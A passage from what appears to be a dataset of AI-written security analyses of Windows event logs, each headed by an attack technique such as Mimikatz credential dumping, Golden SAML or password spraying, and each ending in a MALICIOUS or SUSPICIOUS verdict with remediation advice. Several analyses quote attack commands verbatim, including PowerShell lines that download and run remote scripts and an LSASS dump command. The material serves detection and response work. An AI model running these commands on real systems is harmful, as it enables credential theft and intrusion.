   - The Application logs confirm that Windows Defender is active. However, it is necessary to confirm that it is configured correctly to detect potential malicious PowerShell usage.

### Assessment:
The execution of a PowerShell script that accesses sensitive files in conjunction with the invocation of `wevtutil.exe`, suggests an attempt at evading detection while potentially exfiltrating sensitive data from the Firefox browser.

  - Monitor and alert on anomalous use of tools like `wevtutil.exe`.

### Conclusion:
The logs contain indications of **MALICIOUS** behavior due to the use of PowerShell for handling sensitive browser data and possibly covering tracks using system utilities. Immediate remediation steps and deeper forensic analysis are recommended."
Offline Credential Theft With Mimikatz,"Upon analyzing the provided logs, the following findings have been made:

### System Log
- The logs primarily include a Windows Update event for Microsoft Defender Antivirus. This action is typical for system maintenance and does not indicate any malicious activity.

### Sysmon Log
- There are several process executions logged, specifically involving `cmd.exe`, `powershell.exe`, `wevtutil.exe`, and `conhost.exe`, executed by the user `SERVER002\admin_test`. 
- **Notable Events:**
  - A suspicious command-line argument was observed with `cmd.exe` executed with the command:  
    `""C:\Windows\system32\cmd.exe"" /c ""if not exist %%tmp%%\lsass.DMP (exit /b 1)""`, using `powershell.exe` as its parent process.  
    This command seems to be checking for the existence of an `lsass.DMP` file, which is unusual and could be indicative of a potential attempt to dump LSASS memory, typically associated with credential theft.
  - Several instances of `wevtutil.exe` executions are noted, which can be used to manipulate event logs. This may be a defensive measure by an attacker to cover tracks.
  - Executions of `HOSTNAME.EXE` and `whoami.exe` are more general and can be considered benign when stood alone, but in context, they might be used by an attacker for reconnaissance.
  - `conhost.exe` accompanying process executions is normal for managing console windows and does not appear suspicious by itself.

### Overall Assessment:
The recorded activities, particularly the `cmd.exe` command and the use of `wevtutil.exe` along with `powershell.exe`, raise serious red flags. The combination of these activities aligns with tactics used for stealthy credential dumping and log evasion.

### Resolution
**MALICIOUS** - Based on the combination of the command-line activities and context of potential log manipulation, these logs indicate clear signs of malicious activity. 

### Guidance
- **Immediate Action:** Conduct a thorough investigation on `SERVER002`. Check for additional IOCs (Indicators of Compromise) such as suspicious network traffic or additional unauthorized user accounts or permissions escalations.
- **Forensic Analysis:** Retrieve additional logs, including any available memory dumps or file integrity check results. Evaluate user `admin_test` activities and credentials.
- **Security Measures:** Alert relevant teams, isolate potentially compromised systems, and reset credentials if necessary.
- **Future Monitoring:** Apply tighter monitoring rules and incorporate IDS/IPS systems to better catch anomalous activities like these in real-time. 

The combination of potential LSASS dumping and log file manipulation points toward an advanced stage of compromise, necessitating an immediate and coordinated response to contain and mitigate the threat."
Request for service tickets,"Upon analyzing the provided logs, the following points stand out regarding activities observed on the host ""Server002"":

### **Identified Anomalous Behavior and Indicators of Potential Malicious Activity:**

1. **PowerShell Activity:**
    - There is an instance of PowerShell execution with the following command:
      ```powershell
      & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, iex(iwr https://raw.githubusercontent.com/scriptProject/script/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-script.ps1 -UseBasicParsing), Invoke-script | fl}
      ```
    - This command uses the `Invoke-Expression (iex)` method combined with `Invoke-WebRequest (iwr)` to download and execute a script from an external location (GitHub). This behavior is highly suspicious as it may lead to downloading and executing potentially malicious scripts without the knowledge of the user, representing a classic PowerShell-based attack vector.

2. **Process Activity and Execution Patterns:**
    - Multiple executions of `wevtutil.exe` and `conhost.exe` are logged, but these processes generally appear under legitimate use cases such as event log management (`wevtutil.exe`) and console application hosting (`conhost.exe`).
    - The presence of `whoami.exe` and `hostname.exe` processes can imply enumeration activities, which attackers often use to learn about the environment.

3. **High Integrity Level Execution:**
    - Several processes, including PowerShell, are executed under a ""High"" integrity level, indicating elevated privileges. This makes the potential impact of any malicious activity more severe, as it may allow extensive control over the system.

### **Threat Assessment:**

- **PowerShell Script Execution:**
  - The nature and execution of the script from an external source is concerning and without verifying the script source and its behavior, this activity should be considered potentially malicious. The use of a publicly accessible script could indicate an attempt to compromise the machine or perform unauthorized actions.

### **Resolution: MALICIOUS**

Based on the examination of the logs, particularly the execution of PowerShell with a command that downloads and executes a script from an external source, and considering the elevated privilege levels, there is a high probability of malicious activity. The behavior is consistent with tactics used in various attack scenarios, such as the delivery of malware or credential compromise.

### **Recommended Actions:**

1. **Immediate Containment:**
   - Isolate the affected host from the network to prevent further potential spread of any malicious activities.

2. **Forensic Investigation:**
   - Conduct a detailed forensic investigation to analyze the downloaded script and evaluate any modifications or malicious actions it may have performed.

3. **Security Enhancements:**
   - Review network traffic logs for other suspicious connections or downloads.
   - Implement and enforce strict execution policies on PowerShell and scrutinize logged scripts.
   - Consider deploying enhanced endpoint detection and response solutions to monitor and prevent such occurrences in the future.

4. **Credential and Access Review:**
   - Review user accounts and change passwords to ensure compromised credentials are secured.
   - Assess system configurations and audit logs to understand the full extent of the attack surface utilized.

The evidence aligns strongly with known malicious patterns warranting the classification of the resolution as ""MALICIOUS."" Prompt action and thorough investigation should follow to mitigate risks and safeguard the network environment."
Golden SAML,"### Detailed Analysis of the Logs:

#### Overview:
The provided logs from a Windows machine contain entries from various sources including Windows PowerShell and Sysmon logs. The entries show activities around PowerShell execution and other Windows utilities. The objective is to identify any anomalous or clearly malicious behaviors.

#### Analysis:

1. **Windows PowerShell Logs:**
   - These logs indicate the execution of a PowerShell script that involves importing the ""AADInternals"" module and attempts to create a SAML token. Such PowerShell activities can be indicative of potential exploitation techniques known as ""Golden SAML"" attacks, commonly used in adversary tactics for bypassing authentication and impersonating users.
   - The specific commands being invoked include:
     - `Import-Module AADInternals -Force` - AADInternals is a well-known toolset for Microsoft 365 and Azure AD, often used for security auditing, but it can also be misused by attackers.
     - `New-AADIntSAMLToken -ImmutableID` with suspicious parameters indicates an attempt to forge or manipulate authentication tokens.
     - Use of `.pfx` file `ADFS_signing.pfx` for token signing hints at potential unauthorized access or abuse of a critical signing certificate.

2. **Sysmon Logs:**
   - These logs illustrate the execution of PowerShell processes and several instances of Windows utilities like `wevtutil.exe` and `conhost.exe`. The PowerShell instance executing the concerning script matches the entries found in the PowerShell logs.
   - The presence of expected system utilities such as `wevtutil.exe`, `whoami.exe`, and `svchost.exe` is typically benign, however, their correlation with a potentially malicious PowerShell script execution is suspicious, especially if these are being manipulated or linked to unusual network activity.
   - All activities are being executed by the user ""SERVER002\admin_test"", which denotes that either the account has been compromised or abused for executing these activities.

3. **Command Details:**
   - Execution of `whoami.exe` and `hostname.exe` without additional context can be deemed part of normal enumeration activities, but their usage in conjunction with token manipulation commands in the same timeframe increases their suspiciousness.

#### Conclusion:

Based on the log analysis, particularly focusing on the activity around the PowerShell script execution involving AADInternals and potential token forging activities, the behavior indicates an attempt to perform ""Golden SAML"" attacks. This aligns with known attack patterns used to persist within an environment by gaining unauthorized access to crucial authentication mechanisms.

### Resolution: MALICIOUS

#### Threats and Risks Identified:
- **Identity Compromise:** Unauthorized creation or manipulation of SAML tokens can lead to impersonation attacks, granting attackers access to sensitive services and data.
- **Privilege Escalation:** The activity could facilitate further escalation depending on the systems accessed using the forged tokens.

#### Guidance on How to Proceed:
- **Immediate Mitigation:**
  - Isolate the affected system to prevent potential lateral movement.
  - Review and revoke any active sessions or tokens associated with the `admin_test` account.
  - Change credentials and require a password reset for `admin_test` and any other potentially affected users.
- **Investigation:**
  - Conduct a comprehensive review of recent login activities and modifications within Azure AD and pertinent systems.
  - Assess for any additional signs of lateral movement or data exfiltration.
  - Check integrity and security of the ADFS signing certificate and renew it if necessary to eliminate any unauthorized access.
- **Long-term Measures:**
  - Enhance monitoring for PowerShell execution and sensitive file access.
  - Implement stricter access controls and monitoring on service accounts and admin users.
  - Consider employing honeypot techniques to detect unauthorized or automated actions targeting identity systems."
Password Spray (DomainPasswordSpray),"Upon analyzing the provided Windows event logs, the following observations stand out:

### Suspicious and Malicious Indicators
1. **PowerShell Activity**:
    - The PowerShell logs contain entries indicating the execution of a potentially malicious script. The script, `DomainPasswordSpray.ps1`, is executed via PowerShell, with the specific command:
      ```
      IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force
      ```
    - This script is likely used for password spraying attacks, attempting to authenticate users against a domain with a common password. Downloading and executing scripts directly from the internet using `IEX (Invoke-Expression)` and `IWR (Invoke-WebRequest)` is a high indicator of malicious activity.

2. **Security Log Entries**:
    - There is an event `4672` associated with the user `admin_test` that shows a privileged operation, granting the user with high privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. This could indicate privilege escalation.

3. **Sysmon Logs**:
    - Multiple instances of `wevtutil.exe` are recorded. While `wevtutil.exe` is a legitimate tool used to control and manage event logs, a sudden surge in its execution might be indicative of log file manipulation or clearance, a common practice to cover tracks after an attack.
    - The execution of `system` standard tools such as `hostname.exe` and `whoami.exe` might be used for reconnaissance, especially when followed by the execution of a PowerShell script.

4. **Network Services and Tasks**:
    - The execution of domain password sprays often requires network access and may lead to additional lateral movements within the network if systems are compromised. This raises a significant alert of potential unauthorized access.

### Assessment and Resolution
Given the above findings, the logs contain clear indications of malicious activity:
- Execution of an unauthorized PowerShell script for password spraying.
- Privilege escalation by a possibly compromised account.
- Anomalous operations possibly meant to cover tracks or further exploit the system.

### Recommendation
1. **Immediate Response**:
   - Isolate the machine `Server002` from the network to prevent any further malicious activity or potential spread.
   - Initiate a detailed forensic investigation into the account `admin_test` to check for unauthorized activities and origin of compromise.
   
2. **Review and Harden Security Posture**:
   - Examine Group Policies and ensure PowerShell execution policies are appropriately configured to prevent the unauthorized execution of scripts.
   - Regularly update anti-virus and intrusion detection systems to identify and mitigate known threats.

3. **User Education and Awareness**:
   - Conduct user training sessions emphasizing best practices for password security and recognition of social engineering attacks.

4. **Network Monitoring**:
   - Enhance monitoring of network traffic and user activities to detect abnormal patterns.

### Resolution: MALICIOUS
The logs contain activities that are unequivocally indicative of a compromise. Immediate actions are necessary to mitigate any potential harm and further investigate the source and extent of the breach."
Rubeus kerberoast,"### Detailed Analysis of Windows Event Logs

**Observation:**

1. **Application Log Analysis:**
   - The logs indicate that Windows Defender is consistently active (SECURITY_PRODUCT_STATE_ON). This generally suggests that the endpoint protection is operational and providing a layer of security against malware.

2. **Windows PowerShell Log Analysis:**
   - Numerous entries show PowerShell activity with a focus on command execution. Notably:
     ```
     HostApplication=powershell.exe & {klist purge
     cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.exe"" script /outfile:""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script_output.txt""}
     ```
   - The command involves `klist purge`, a utility to clear Kerberos ticket caches potentially indicating an attempt to prune credentials, and the execution of a script from a `Temp` directory, which can be suspicious. Execution from a Temp folder is often observed in malicious activities.

3. **Sysmon Log Analysis:**
   - Process creation related to `powershell.exe` executing with embedded commands, appears repeatedly. This could suggest script execution automation possibly without user awareness.
   - Sysmon records:
     - Process IDs (6224, 5964, 6848, among others) reveal child processes related to scripts being invoked directly from command shells and PowerShell.
     - Activities involving `conhost.exe` as a parent process can be legitimate or malicious depending on context, though often seen when executing console applications.
     - `klist.exe` and `cmd.exe` are run directly in conjunction with PowerShell activities, which is abnormal and might be used in credential theft strategies or to launch other scripts without user notice.

4. **System and Security Logs:**
   - No abnormalities or entries are provided, potentially indicating no logged events or that the logs are not available for this session.

**Assessment:**

- **Suspicious Behavior Indicators:**
  - Use of `cmd.exe` and `klist.exe` in conjunction with PowerShell indicates an elevated threat level.
  - Execution from the `Temp` directory often highlights code/scripts not vetted or secured, aligning with possible malware delivery or execution vectors.
  - Despite Defender being operational, no alerts or blocks are visible, which could either mean potential evasion or benign but rare activity.

**Conclusion:**

- **Final Resolution: SUSPICIOUS**
  - The presence of PowerShell executing commands that involve credential manipulation and script execution from unusual directories calls for further investigation. These behaviors, while not overtly malicious without context, are often leveraged in cyber-attacks.
  - Recommended actions involve isolating the host, conducting a deeper forensic investigation, and checking for any Indicators of Compromise (IOCs) based on executed scripts and commands.
- **Guidance:**
  - Investigate the script path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.exe` for the presence of known malware or suspicious content.
  - Review network logs for unauthorized access or data exfiltration considering credential cache clearing with `klist`.
  - Ensure antivirus/endpoint detection definitions are up-to-date and consider stricter logging and alerting on PowerShell scripts and temp directory executions within this endpoint."
Extract Windows Credential Manager via VBA,"Upon examining the provided Windows event logs, several activities indicate potential malicious activity, specifically related to the execution of PowerShell scripts from an external source. Below is a detailed analysis of the logs with specific findings highlighted:

1. **Windows PowerShell Logs:**
   - Multiple instances of PowerShell were used to execute scripts from an external source: `""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1""` via the command:
     ```
     powershell.exe & { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"" -UseBasicParsing)
     Invoke-script -macroFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""}
     ```
   - This script execution method is a common tactic used in attacks to download and run potentially malicious code directly into memory using `Invoke-Expression` (`IEX`) and `Invoke-WebRequest` (`iwr`).

2. **Sysmon Logs:**
   - Sysmon Event ID 1 entries show the execution of the PowerShell process (`powershell.exe`) that aligns with the PowerShell logs' timestamps, indicating potential malicious scripting activity.
   - The process is running with high integrity, suggesting it might have elevated privileges, making its activity more concerning.
   - The external script execution aligns with common attack vectors, where malicious scripts are hosted on platforms like GitHub for easy access and execution without direct download activities visible.

3. **Security Logs:**
   - Security logs include Event ID 4616, indicating changes to the system time, which could potentially be an attempt to evade detection or interfere with time-based security mechanisms.

**Assessment:**
- **Malicious Indicators:** The use of PowerShell to execute scripts from an external URL and possible time manipulation are strong indications of potentially malicious behavior.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further execution or spread of the potential threat.
   - Conduct a forensic analysis on Server002 to determine the scope and impact of the malicious activity.
   - Examine the downloaded script and any files created or executed by it for malicious content or payloads.

2. **Remediation:**
   - Ensure that PowerShell execution policies are set to a restricted level to prevent unauthorized script execution.
   - Check the system for any additional signs of compromise, such as new user accounts, unexpected scheduled tasks, or altered system configurations.
   - Update antivirus definitions and perform a full system scan.

3. **Long-term Measures:**
   - Review and strengthen security policies regarding script execution and network traffic monitoring.
   - Implement and review application whitelisting to prevent unauthorized applications from running.
   - Consider deploying advanced threat protection solutions that specialize in detecting fileless threats and script-based attacks. 

4. **Notification and Reporting:**
   - Notify the security team and stakeholders of the breach and ongoing remediation efforts.
   - If necessary, report the incident to relevant legal or regulatory bodies, particularly if sensitive data was compromised.

These actions should help mitigate the current threat and bolster defenses against future security incidents."
Dump LSASS.exe using imported Microsoft DLLs,"Upon reviewing the provided Sysmon and PowerShell logs, several indicators of potentially malicious activity are apparent:

1. **PowerShell Activity**: 
   - There are multiple instances where `powershell.exe` is being executed with the following unusual command: 
     - `""powershell.exe"" & {C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.data.001.dmp -x 0x41}`.
   - This command suggests that an executable `xordump.exe` is being run through PowerShell to create a memory dump of the `lsass` process, potentially containing sensitive information such as credentials.

2. **Wevtutil and Conhost Activity**:
   - We see repeated process creation events involving `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is a legitimate Windows utility used for querying and managing event logs, but in conjunction with PowerShell activity that involves memory dumping, it appears suspect. Such a pattern can be used by threat actors to cover their tracks by clearing or exporting event logs.

3. **Whoami and Hostname Execution**:
   - The execution of `whoami.exe` and `hostname.exe` could be legitimate or could suggest reconnaissance activities trying to gather information about the compromised host and the currently authenticated user.

4. **High Integrity Level**:
   - All processes are running with a High Integrity Level, which indicates elevated permissions. This can suggest an attempt to perform admin-level actions on the system.

Overall, the combination of PowerShell being used to execute a suspicious file (`xordump.exe`), the manipulation of event logs with `wevtutil.exe`, and the collection of system information all point towards malicious behavior.

Based on these observations, the activity in the logs should be classified as:

**Resolution: MALICIOUS**

### Recommendations to Proceed:
- **Containment**: Immediately isolate the affected host to prevent further lateral movement within the network.
- **Investigation**: Conduct forensic analysis on the host, focusing on `xordump.exe` and any resulting memory dumps.
- **Remediation**: Remove any unauthorized tools or scripts found on the system.
- **Review Logs**: Investigate logs from other interconnected systems to identify potential spread.
- **Patch and Update**: Ensure systems are up-to-date with the latest security patches.
- **User Awareness**: Educate users to identify and report suspicious activity, such as unexpected system behavior or unauthorized access prompts."
Brute Force Credentials of single Azure AD user,"Upon reviewing the event logs provided, there's a significant indicator of potentially malicious activity:

1. **Suspicious PowerShell Commands** - The Sysmon and PowerShell logs indicate the execution of a PowerShell script attempting to connect to AzureAD using various passwords for the account `bruce.wayne@contoso.com`. Such activity strongly suggests a password brute-force attack. The PowerShell script is iterating over a list of passwords, trying each one to see if it can gain unauthorized access to the AzureAD account. This is a clear sign of malicious behavior.

2. **Execution Context** - The user `SERVER002\admin_test` is executing these commands. While this user theoretically could be a security administrator testing passwords, the lack of clear authorizations and documentation for such action, combined with the stealthy behavior of the activity, suggests it is unauthorized and harmful. The execution of such scripts without proper change management and auditing is a red flag.

3. **Additional Process Executions** - While there are multiple instances of process executions such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe`, these appear in expected directories and don't directly indicate anomalous behavior within this context. Such processes can be commonly used in scripted and administrative tasks.

4. **Updates and Maintenance Logs** - The presence of standard system updates and the execution of processes like `wbem\WmiPrvSE.exe` and `CompatTelRunner.exe`, which are part of normal Windows operations, further support that there is no additional unauthorized or unknown software execution beyond the identified malicious PowerShell activity.

### Assessment:

- **Malicious Activity Detected**: The detected PowerShell command execution targeting AzureAD for brute-forcing indicates a concrete unauthorized attempt to compromise a user account.

### Recommendations:

- **Immediate Response**: 
  - Disable `SERVER002\admin_test` account until further review.
  - Change credentials for all affected accounts and ensure strict password policies.
  - Audit and review any potential access from `bruce.wayne@contoso.com` if the entity exists within the organization.

- **Further Investigation**:
  - Trace back to determine how the script was deployed and initiated. Check for unauthorized administrative access or script deployment methods.
  - Monitor network traffic for signs of data exfiltration or other malicious activity originating from this host.

- **Preventive Measures**:
  - Implement tighter access controls and monitoring on the use of PowerShell scripts, particularly involving automated credential attempts.
  - Ensure all administrative actions are properly logged and audited.

**Resolution: MALICIOUS** - The logs contain explicit evidence of a malicious attempt to brute-force AzureAD credentials using PowerShell. Immediate actions as recommended are necessary to mitigate and investigate the incident further."
Export Certificates with Mimikatz,"Based on a detailed analysis of the logs provided, the following observations and conclusions are drawn:

### Application Log:
1. The entries in the Application log are related to routine operations and Windows Defender is shown to be operational. There are no indications of any anomalous activity here.

### Sysmon Log:
1. **PowerShell and Conhost Execution**: 
   - The logs show execution of `powershell.exe`, `conhost.exe`, and several uses of `wevtutil.exe` by the user ""SERVER002\\admin_test"". While `powershell.exe` and `conhost.exe` are commonly used in legitimate administrative tasks, their presence, especially in combination and frequency, warrants further scrutiny. However, without additional command-line data or context, this alone is not conclusive.
   
2. **Suspicious CMD Command Execution**:
   - A key point of interest is the execution of `cmd.exe` with the command `""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\x64\script.exe"" ""crypto::certificates /systemstore:local_machine /store:my /export""`. This action is suspicious as it may be indicative of an attempt to export certificates from the system, which can be a technique used by an attacker to exfiltrate sensitive data or install unauthorized certificates.
   
3. **Usage of `wevtutil.exe`**:
   - The frequent invocation of `wevtutil.exe` might suggest manipulation of event logs. However, it's a regular tool used in many administrative duties. Yet, when combined with the aforementioned suspicious activities, it may indicate attempts to cover tracks by modifying/deleting log entries.

4. **High Integrity Level**: 
   - The processes run under a ""High"" integrity level suggest that the actions are executed with elevated privileges, typical for administrative tasks but also for malicious actions when higher privileges are necessary.

5. **`whoami.exe` and `hostname.exe` Execution**:
   - The execution of basic command-line tools like `whoami.exe` and `hostname.exe` is not typically suspicious but can be used by attackers to gather information about the system environment and logged-in users.

### Conclusion:
The logs indeed contain potential indicators of suspicious activity primarily due to the execution of a possibly malicious script via `cmd.exe` aimed at retrieving system certificates, combined with PowerShell and event log manipulation tools (`wevtutil.exe`). This pattern is suggestive of behavior often associated with malicious activities.

### Recommendation:
- Conduct a thorough forensic investigation into the `script.exe` mentioned, specifically around the context of its execution and its origin.
- Obtain further details on the command-line arguments used with PowerShell and any additional event logs for correlation and context.
- Review recent changes in event logs to detect potential modifications or deletions.
- Validate the machine's security posture, such as examining Windows Defender logs for any blocked actions or alerts.

### Resolution:
**SUSPICIOUS** - The presence of suspicious patterns and potential indicators of compromise highlights the need for further investigation to rule out or confirm malicious activities."
Crafting Active Directory silver tickets with mimikatz,"Upon reviewing the provided logs, the following points of interest and concerns were identified:

### Sysmon Log Analysis:
1. **Suspicious Command Execution**:
   - There is a command execution recorded with `cmd.exe` under the user `SERVER002\\admin_test` with a command line: `""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\x64\\script.exe`. This construction is commonly used to obfuscate the launching of potentially malicious executables by hiding them in temporary directories.

2. **High Integrity Execution**:
   - The cmd.exe is executed at a High Integrity Level, which indicates it has been run with administrative privileges. Such privilege levels are commonly abused by malware to perform harmful actions.

3. **Process Execution Patterns**:
   - Continuous execution of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) with various command-line arguments such as `/ping`, `/svc`, `/regsvc`. While these could be legitimate update processes, the frequency and the command-line arguments appear irregular and deviate from standard update patterns.

4. **Use of `wevtutil.exe` and `conhost.exe`**:
   - `wevtutil.exe` and `conhost.exe` are being repeatedly executed by `SERVER002\\admin_test`. `wevtutil` can be used for clearing event logs, which could be indicative of anti-forensic behavior by a malicious actor trying to cover tracks.

5. **Presence of Multiple wsmprovhost.exe Executions**:
   - There are entries showing `wsmprovhost.exe` as parent processes, which are associated with Windows Remote Management. An unusually high number of these processes or their use outside usual management times can be suspicious.

### Security Log Analysis:
- The security log events primarily involve SYSTEM account activities with elevated privileges (`SeDebugPrivilege`, etc.). These appear consistent with system operations, but the context of processes previously seen (like executing scripts in TEMP directories) warrants attention.

### Application Log Analysis:
- Windows Defender remains active and reports no shutdown or suspicious activity, indicating it has not detected any immediate threats. This does not rule out sophisticated threats but provides some assurance against recognized signatures.

### Overall Assessment:
- Several aspects of the logs indicate potentially suspicious activity, particularly the invocation of processes from unusual directories, extensive launching of PowerShell and cmd, and the use of `wevtutil.exe`. The pattern of executing binaries from TEMP paths with admin-level privileges should not happen under typical conditions unless it is part of a legitimate batch job or deployment process, which would need confirmation.

### Conclusion:
Given the anomalies noted, while no definitive malicious actions (like file tampering, privilege escalations confirmed via security logs, etc.) are captured, the behavior is indeed concerning.

**Resolution: SUSPICIOUS**

### Recommendations:
1. **Further Investigation**:
   - Conduct deeper analysis of the script executed from the TEMP directory. If `script.exe` is not a recognized and approved executable, obtain a hash and scan it against malware databases.
   
2. **Network Analysis**:
   - Review network logs for unusual outbound connections, particularly those initiated from processes in TEMP directories or by admin users.

3. **User Activity Review**:
   - Verify with `admin_test` whether these activities were conducted knowingly and assess the legitimacy of such actions.

4. **Enhanced Monitoring**:
   - Enable advanced threat protection and auditing on `SERVER002` for better insight into command execution and binary launches.

5. **Update and Educate**:
   - Ensure all software is up-to-date and educate users on secure practices, especially around executing and downloading files from the internet or unknown locations."
Credential Dumping with NPPSpy,"From the provided logs, there are several critical indicators of potential malicious activity that stand out, warranting further attention and potentially indicating compromise.

### Indicators of Malicious Activity:

1. **Suspicious Use of PowerShell**:
   - Multiple event logs show PowerShell executing with a script that involves copy and modification of system files. Specifically, `script.dll` is being transferred to the `C:\\Windows\\System32` directory. The script also modifies the `NetworkProvider` registry, appending an additional ""script"" entry. This behavior is often indicative of persistent or stealthy configurations aimed at maintaining access or exfiltrating data.
   - The PowerShell command also suggests persistence mechanisms by modifying the registry in a way that forces the system to handle a new custom script provider, essentially hooking into system operations via a DLL.

2. **Cleartext Password Warning**:
   - The script explicitly contains a message stating ""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt"". This indicates attempted credential theft, where attackers would capture user credentials in cleartext for further compromise or lateral movement.

3. **Execution of System Utilites**:
   - The frequent invocation of critical Windows utilities (`whoami.exe`, `HOSTNAME.EXE`, etc.) using PowerShell is often associated with enumeration activities from an attacker. They may be attempting to gather information about the current user and environment to strategize further exploitation.

4. **Observed User Activity**:
   - Most of these actions are being carried out under the user `SERVER002\\admin_test`, which may indicate that administrator privileges are being exploited for these activities.

5. **Sysmon Entries Confirm Suspicious Processes**:
   - Sysmon logs corroborate these entries by showing the execution of PowerShell with commands that replicate those seen in the PowerShell log entry.
   - The process chain involving `conhost.exe` and `wevtutil.exe` repeatedly indicates that these commands are being managed and invoked, typically seen in environments where control is executed remotely or programmatically.

Based on the analysis of these event logs, the actions observed are characteristic of a system under exploit or compromise, with particular focus on persistence, and potential credential access.

### Resolution:
**MALICIOUS**

### Guidance:
- **Immediate Containment**: Isolate Server002 from the network to prevent potential exfiltration of data or lateral movement.
- **Forensic Analysis**: Conduct a full forensic investigation of the host to understand the extent of the damage and pinpoint the entry vector.
- **Password Change**: Enforce password changes for all users, especially for those with administrative privileges.
- **Review and Reversion**: Examine and potentially revert any changes to critical system files and registry hives.

Brute Force:Credential Stuffing using Kerbrute Tool,"### Detailed Analysis

From the provided logs, I have identified several key points for analysis:

1. **Application Logs**:
   - The logs indicate that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), which shows that the system's built-in security measures are operational. This generally indicates that standard malware defenses are active, but does not rule out sophisticated threats that could bypass such defenses.

2. **Sysmon Logs**:
   - A PowerShell process was started at `2024-10-24 14:11:56.7562254` with the user `SERVER002\\admin_test`. The command executed was suspicious and included a `bruteforce` script using PowerShell. The command-line argument suggests activity consistent with credential brute-forcing, which is a common technique in penetration testing or malicious intrusion. The script attempts to access specific domains and files which have sensitive naming, indicating potential malicious behavior.
   - Multiple executions of `wevtutil.exe` and `conhost.exe` were noted. While these can be legitimate, in the context of the PowerShell command included, their frequency and the timing lead to raised suspicion of a possible event log manipulation or cleaning attempt.
   - An instance of `MicrosoftEdgeUpdate.exe` and its related processes are repeatedly noted. It's common for software updates to use multiple processes; however, the context and frequency here warrant further investigation as it might be an attempt to hide malicious activity.

3. **Security Logs**:
   - An EventID `4624` indicates successful logons, and event `4672` shows special privileges were assigned during those logons, such as `SeDebugPrivilege`. This can be concerning especially if not expected, as this privilege allows debugging of processes, often leveraged by attackers post-compromise to manipulate or interrogate system internals.
   - Numerous instances of `EventID 5379` indicate credential validation failures, suggesting possible brute force attempts or unauthorized access attempts.

4. **Windows PowerShell Logs**:
   - PowerShell executions showing `bruteforce` actions. This type of behavior is not normal for benign user actions and implies an attempt to gain unauthorized access to credentials within the environment.

### Assessment

The log analysis suggests the presence of unusual and potentially malicious activities on the host `Server002`. The PowerShell command execution with a `bruteforce` script, combined with attempts to export logs (`wevtutil.exe`) and logs of high-privilege assignments (`4672`), strongly indicate potential unauthorized access and activity aimed at compromising the system.

### Resolution

- **MALICIOUS**: The behavior and indicators in the logs (brute force attempts, use of wevtutil.exe, special privilege assignments) classify the activity as malicious. Immediate containment actions are recommended, along with a deeper forensic investigation to assess the extent of the compromise and implement remediation strategies. It is also advisable to review user access policies and enhance monitoring for such suspicious activities in the future."
LSASS read with pypykatz,"Upon reviewing the provided Sysmon log entries, here are my findings:

1. **Overview of the Observed Activities:**
   - The logs primarily revolve around processes executing on ""Server002"" as the user ""SERVER002\\admin_test"".
   - The processes observed include:
     - `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and associated `conhost.exe` sessions.
   - Multiple instances of `wevtutil.exe` are launched. This executable is used to manage Windows Event logs, which can be a normal operation but also a potential indicator of log tampering.
   - `whoami.exe` and `hostname.exe` are executed, which might indicate reconnaissance activity, trying to confirm the current logged-on user and machine name.
   - A notable command execution through `cmd.exe` indicating a command involving a script from the user's Temporary files directory, which appears somewhat obfuscated: `\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\venv_data_001\\Scripts\\script\"" live lsa`.

2. **Suspicious Elements:**
   - The repeated execution of `wevtutil.exe` might suggest attempts to clear or tamper with event logs.
   - The obfuscated command running from a temporary directory could indicate an attempt to execute malicious scripts potentially involved in credential dumping or other malicious activities.
   - The high frequency and combination of executed utilities (`whoami`, `hostname`, and `cmd`) are typical in scripts used for reconnaissance or post-exploitation activities.

3. **Potential Threat Assessment:**
   - The usage pattern of system binaries (`wevtutil`, `cmd`, `whoami`) and execution from the Temp directory aligns with tactics often used in malicious activities, such as privilege escalation, credential dumping, or reconnaissance.

**Conclusion:**
- **Resolution: SUSPICIOUS**
  - The activities observed in the logs suggest potential exploration or preparatory actions consistent with malicious behavior, though not definitively enough to label it as outright malicious without further context or evidence. However, the actions, particularly the command executed from the Temp directory and use of `wevtutil.exe`, warrant additional scrutiny.

**Guidance on Proceeding:**
- Further investigate the command executed with `cmd.exe`, especially focusing on its purpose, origin, and effect.
- Verify the integrity of event logs and determine if any entries were deleted or altered.
- Review activities and recent changes in user accounts on SERVER002.
- Consider monitoring all administrator-level activities and insulate critical accounts to prevent privilege escalation.
- Search for additional logs or data from surrounding timeframes or related systems for corroborative information regarding potential lateral movement or escalation attempts."
Cached Credential Dump via Cmdkey,"**Analysis of the Provided Windows Event Logs**

Upon reviewing the logs from different channels (System, Application, Security, and Sysmon), here's my detailed analysis:

### System Log:
